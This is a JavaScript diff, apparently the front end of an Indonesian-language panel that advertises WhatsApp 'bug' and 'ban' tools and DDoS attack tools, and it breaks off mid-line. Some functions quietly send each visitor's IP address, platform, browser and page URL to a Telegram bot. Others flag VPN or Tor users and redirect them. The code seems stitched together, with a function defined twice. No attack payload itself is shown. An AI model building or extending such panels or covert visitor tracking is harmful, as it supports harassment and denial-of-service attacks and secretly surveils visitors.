+// Enhanced notification function for TikTok
+function showNotification(title, content) {
+    const notificationContainer = document.getElementById('notificationContainer');
+    if (!notificationContainer) return;
+    
+    const notification = document.createElement('div');
+    notification.className = 'whatsapp-notification';
+    notification.innerHTML = `
+        <div class="notification-header">
+            <div class="app-name">
+                <i class="fab fa-tiktok" style="color: #25F4EE;"></i>
+                <span>TikTok Tools</span>
+            </div>
+            <div class="time">now</div>
+        </div>
+        <div class="notification-title">${title}</div>
+        <div class="notification-content">${content}</div>
+    `;
+    
+    notificationContainer.appendChild(notification);
+    
+    // Remove notification after 5 seconds
+    setTimeout(() => {
+        notification.classList.add('fade-out');
+        setTimeout(() => {
+            if (notification.parentNode) {
+                notification.remove();
+            }
+        }, 500);
+    }, 5000);
+}
+
+// Close full frame with Escape key
+document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape') {
+        closeFullFrame();
+    }
+});
+
+// Initialize TikTok button in quick actions
+function initTikTokQuickActions() {
+    const quickActions = document.querySelector('.grid.grid-cols-1.md\\:grid-cols-3.gap-4');
+    if (quickActions && !document.querySelector('.btn-tiktok-quick')) {
+        const tiktokButtonHTML = `
+            <button onclick="showFullFrame()" class="btn-modern btn-tiktok-quick py-4 text-sm">
+                <i class="fab fa-tiktok mr-2"></i>TikTok Tools
+            </button>
+        `;
+        quickActions.insertAdjacentHTML('beforeend', tiktokButtonHTML);
+    }
+}
+
+// Initialize all TikTok elements when page loads
+document.addEventListener('DOMContentLoaded', function() {
+    initTikTokQuickActions();
+    
+    // Add TikTok button styles
+    const tiktokStyles = `
+        .nav-tiktok {
+            background: linear-gradient(135deg, #000000, #25F4EE, #FE2C55);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+        
+        .nav-tiktok.active {
+            background: linear-gradient(135deg, #25F4EE, #FE2C55);
+            box-shadow: 0 4px 15px rgba(37, 244, 238, 0.4);
+        }
+        
+        .btn-tiktok-quick {
+            background: linear-gradient(135deg, #000000, #25F4EE, #FE2C55) !important;
+        }
+        
+        .btn-tiktok-quick:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(37, 244, 238, 0.6) !important;
+        }
+        
+        .full-frame-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            background: white;
+            display: none;
+        }
+        
+        .full-frame-container.active {
+            display: block;
+        }
+        
+        .full-frame-header {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            color: white;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 10000;
+            border-bottom: 2px solid #25F4EE;
+        }
+        
+        .full-frame-title {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 600;
+        }
+        
+        .full-frame-iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+        
+        .close-full-frame {
+            background: #FE2C55;
+            border: none;
+            color: white;
+            padding: 8px 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .close-full-frame:hover {
+            background: #ff3b6a;
+            transform: scale(1.05);
+        }
+    `;
+    
+    const styleSheet = document.createElement('style');
+    styleSheet.textContent = tiktokStyles;
+    document.head.appendChild(styleSheet);
+});
+
+// Handle page navigation to ensure TikTok buttons work
+function showPage(pageId) {
+    // Your existing page navigation code
+    document.querySelectorAll('.page').forEach(page => {
+        page.classList.remove('active');
+    });
+    
+    document.getElementById(pageId).classList.add('active');
+    
+    document.querySelectorAll('.nav-tab-modern').forEach(tab => {
+        tab.classList.remove('active');
+    });
+    
+    // Reinitialize TikTok buttons when switching pages
+    setTimeout(() => {
+        initTikTokQuickActions();
+    }, 100);
+}
+// Check VPN/Proxy
+async function checkSecurity() {
+  try {
+    const response = await fetch("https://ipapi.co/json/");
+    const data = await response.json();
+    if(data.security && (data.security.proxy || data.security.vpn || data.security.tor)) {
+      const reason = `Menggunakan ${data.security.vpn ? "VPN" : data.security.proxy ? "Proxy" : "Tor"}`;
+      showWarning(reason);
+      
+      // Send to Telegram dengan typografi yang lebih baik
+      const message = `
+🛡️ *SECURITY ALERT* 🛡️
+━━━━━━━━━━━━━━━━━━━━
+⚠️ *VPN/PROXY DETECTED*
+      
+🌐 *IP Address:* \`${data.ip}\`
+🔒 *Security Type:* ${data.security.vpn ? "🔷 VPN" : data.security.proxy ? "🔶 Proxy" : "⚫ Tor"}
+🏴 *Country:* ${data.country_name}
+🕐 *Time:* ${new Date().toLocaleString("id-ID")}
+━━━━━━━━━━━━━━━━━━━━
+*Action:* ❌ ACCESS BLOCKED
+      `.trim();
+      
+      await sendTelegramMessage(message);
+      
+      setTimeout(() => location.href = "https://google.com", 5000);
+      return true;
+    }
+    return false;
+  } catch (e) {
+    console.error("Security check failed");
+    return false;
+  }
+}
+
+// Show warning function
+function showWarning(reason) {
+  Swal.fire({
+    icon: 'warning',
+    title: '🛡️ Security Warning',
+    html: `<div style="text-align: center;">
+            <h3 style="color: #ff6b6b;">Akses Diblokir!</h3>
+            <p><strong>Alasan:</strong> ${reason}</p>
+            <p style="font-size: 14px; color: #666;">Anda akan dialihkan dalam 5 detik...</p>
+          </div>`,
+    confirmButtonText: 'Mengerti',
+    background: 'rgba(255, 255, 255, 0.95)',
+  });
+}
+
+// Send visitor info to Telegram
+async function sendVisitorInfo() {
+  try {
+    const ipResponse = await fetch("https://api.ipify.org?format=json");
+    const ipData = await ipResponse.json();
+    
+    const message = `
+🎯 *NEW VISITOR DETECTED*
+━━━━━━━━━━━━━━━━━━━━
+🌐 *IP Address:* \`${ipData.ip}\`
+🖥️ *Platform:* ${navigator.platform}
+🔖 *Browser:* ${navigator.userAgent.split(' ')[0]}
+📱 *Resolution:* ${window.innerWidth} × ${window.innerHeight}
+📍 *Page:* ${window.location.href}
+🕒 *Time:* ${new Date().toLocaleString("id-ID")}
+━━━━━━━━━━━━━━━━━━━━
+*Status:* ✅ MONITORING ACTIVE
+    `.trim();
+    
+    await sendTelegramMessage(message);
+  } catch (e) {
+    console.error("Failed to send visitor info");
+  }
+}
+
+// Global variables
+let selectedBug = null;
+let selectedBan = null;
+let selectedDDOS = null;
+let ddosInterval = null;
+let currentBotCount = 3;
+
+// Initialize on page load
+document.addEventListener('DOMContentLoaded', function() {
+  checkAutoLogin();
+  updateBotWarnings();
+  updateLastUpdateTime();
+});
+
+// Update last update time
+function updateLastUpdateTime() {
+  const now = new Date();
+  const timeString = now.toLocaleTimeString('id-ID', { 
+    hour: '2-digit', 
+    minute: '2-digit',
+    second: '2-digit'
+  });
+  const lastUpdateElement = document.getElementById('last-update');
+  if (lastUpdateElement) {
+    lastUpdateElement.textContent = timeString;
+  }
+}
+
+// Check for auto login
+function checkAutoLogin() {
+  const rememberMe = localStorage.getItem('xtc_remember_me');
+  const expiryDate = localStorage.getItem('xtc_session_expiry');
+  
+  if (rememberMe === 'true' && expiryDate) {
+    const now = new Date().getTime();
+    const expiry = parseInt(expiryDate);
+    
+    if (now < expiry) {
+      autoLoginToDashboard();
+    } else {
+      clearRememberMe();
+    }
+  }
+}
+
+// Auto login langsung ke dashboard
+function autoLoginToDashboard() {
+  let storedUsername = localStorage.getItem('xtc_username');
+  if (!storedUsername) {
+    storedUsername = generateUsername();
+    localStorage.setItem('xtc_username', storedUsername);
+  }
+  
+  let joinDate = localStorage.getItem('xtc_join_date');
+  if (!joinDate) {
+    joinDate = generateJoinDate();
+    localStorage.setItem('xtc_join_date', joinDate);
+  }
+  
+  document.getElementById('dashboard-username').textContent = storedUsername;
+  document.getElementById('dashboard-join-date').textContent = `Bergabung: ${joinDate}`;
+  
+  document.getElementById('login-page').classList.remove('active');
+  document.getElementById('main-page').classList.add('active');
+  
+  updateStats();
+  updateSessionExpiryDisplay();
+  setInterval(updateStats, 30000);
+  setInterval(updateLastUpdateTime, 1000);
+}
+
+// Set remember me session
+function setRememberMeSession() {
+  const expiryDate = new Date();
+  expiryDate.setDate(expiryDate.getDate() + 7);
+  
+  localStorage.setItem('xtc_remember_me', 'true');
+  localStorage.setItem('xtc_session_expiry', expiryDate.getTime().toString());
+}
+
+// Clear remember me data
+function clearRememberMe() {
+  localStorage.removeItem('xtc_remember_me');
+  localStorage.removeItem('xtc_session_expiry');
+  localStorage.removeItem('xtc_saved_username');
+  localStorage.removeItem('xtc_saved_password');
+}
+
+// Update session expiry display
+function updateSessionExpiryDisplay() {
+  const expiryDate = localStorage.getItem('xtc_session_expiry');
+  if (expiryDate) {
+    const expiry = new Date(parseInt(expiryDate));
+    const now = new Date();
+    const diffTime = expiry - now;
+    const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
+    
+    const expiryElement = document.getElementById('session-expiry');
+    if (expiryElement) {
+      if (diffDays > 0) {
+        expiryElement.textContent = `Session aktif: ${diffDays} hari lagi`;
+        expiryElement.style.color = diffDays > 3 ? '#10b981' : '#f59e0b';
+      } else {
+        expiryElement.textContent = 'Session expired';
+        expiryElement.style.color = '#ef4444';
+      }
+    }
+  }
+}
+
+// Enhanced Navigation System
+function showPage(pageName) {
+  const mainPages = ['dashboard', 'whatsapp-bug', 'whatsapp-ban', 'ddos-tools'];
+  
+  // Hide all pages with animation
+  mainPages.forEach(page => {
+    const pageElement = document.getElementById(page);
+    if (pageElement) {
+      pageElement.style.opacity = '0';
+      setTimeout(() => {
+        pageElement.classList.remove('active');
+      }, 200);
+    }
+  });
+  
+  // Update navigation tabs
+  document.querySelectorAll('.nav-tab-modern').forEach(tab => {
+    tab.classList.remove('active');
+  });
+  
+  // Show target page with delay for smooth transition
+  setTimeout(() => {
+    const targetPage = document.getElementById(pageName);
+    if (targetPage) {
+      targetPage.classList.add('active');
+      setTimeout(() => {
+        targetPage.style.opacity = '1';
+      }, 50);
+    }
+    
+    // Update active tab
+    const activeTab = Array.from(document.querySelectorAll('.nav-tab-modern')).find(tab => 
+      tab.onclick && tab.onclick.toString().includes(`'${pageName}'`) ||
+      tab.getAttribute('onclick') === `showPage('${pageName}')`
+    );
+    
+    if (activeTab) {
+      activeTab.classList.add('active');
+    }
+    
+    // Update page indicator
+    const pageTitles = {
+      'dashboard': '📊 Dashboard',
+      'whatsapp-bug': '🐛 WhatsApp Bug Tools', 
+      'whatsapp-ban': '🔨 WhatsApp Ban Tools',
+      'ddos-tools': '⚡ DDOS Attack Tools'
+    };
+    
+    const indicator = document.getElementById('current-page-indicator');
+    if (indicator && pa
